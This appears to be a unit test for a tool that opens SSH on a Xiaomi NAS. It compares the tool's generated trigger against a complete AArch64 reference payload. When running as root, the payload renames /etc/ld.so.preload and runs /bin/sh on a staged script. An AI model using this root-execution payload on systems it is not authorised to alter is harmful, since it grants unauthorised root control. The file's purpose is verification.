import shutil
import struct
import subprocess
import tempfile
import unittest
from pathlib import Path

from xiaomi_nas_ssh.trigger import build_trigger


@unittest.skipUnless(shutil.which("clang"), "Independent assembler check needs clang")
class AssemblerReferenceTests(unittest.TestCase):
    def test_generated_instructions_match_independent_clang_assembler(self):
        stage = "/etc/.nas-ssh-0123456789ab"
        reference = r'''.text
.p2align 2
entry:
 mov x8, #174
 svc #0
 cbnz x0, done
 mov x0, #-100
 adr x1, old
 mov x2, #-100
 adr x3, claimed
 mov x4, #1
 mov x8, #276
 svc #0
 cbnz x0, done
 mov x0, #17
 mov x1, xzr
 mov x2, xzr
 mov x3, xzr
 mov x4, xzr
 mov x8, #220
 svc #0
 cbnz x0, done
 adr x0, shell
 adr x5, script
 stp x0, x5, [sp, #-32]!
 str xzr, [sp, #16]
 mov x1, sp
 mov x2, xzr
 mov x8, #221
 svc #0
 mov x0, #127
 mov x8, #93
 svc #0
done:
 ret
old: .asciz "/etc/ld.so.preload"
claimed: .asciz "@STAGE@/preload.claimed"
shell: .asciz "/bin/sh"
script: .asciz "@STAGE@/run.sh"
'''.replace("@STAGE@", stage)
        with tempfile.TemporaryDirectory() as directory:
            source = Path(directory) / "reference.S"
            obj = Path(directory) / "reference.o"
            source.write_text(reference)
            subprocess.run(["clang", "-target", "aarch64-linux-gnu", "-c", str(source), "-o", str(obj)],
                           capture_output=True, check=True, timeout=30)
            data = obj.read_bytes()
        offset = struct.unpack_from("<Q", data, 40)[0]
        entry_size, count, name_index = struct.unpack_from("<HHH", data, 58)
        sections = [struct.unpack_from("<IIQQQQIIQQ", data, offset + i * entry_size) for i in range(count)]
        ns = sections[name_index]
        names = data[ns[4]:ns[4] + ns[5]]
        text = None
        for s in sections:
            name = names[s[0]:].split(b"\0", 1)[0]
            if name == b".text":
                text = data[s[4]:s[4] + s[5]]
            if name == b".rela.text":
                self.assertEqual(s[5], 0, "No unresolved relocations may be shipped")
        self.assertIsNotNone(text)
        self.assertEqual(build_trigger(stage)[4096:4096 + len(text)], text)


if __name__ == "__main__":
    unittest.main()
